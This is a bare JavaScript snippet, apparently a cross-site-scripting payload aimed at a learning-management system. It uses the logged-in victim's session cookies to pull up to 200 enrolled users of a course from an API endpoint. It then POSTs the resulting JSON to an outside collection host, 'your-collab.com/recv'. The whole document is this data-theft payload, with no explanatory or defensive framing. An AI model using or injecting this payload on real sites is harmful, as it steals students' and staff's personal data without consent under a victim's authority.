fetch('/learn/api/public/v3/courses/_1_1/users?limit=200',{credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('https://your-collab.com/recv',{method:'POST',body:JSON.stringify(d)}));
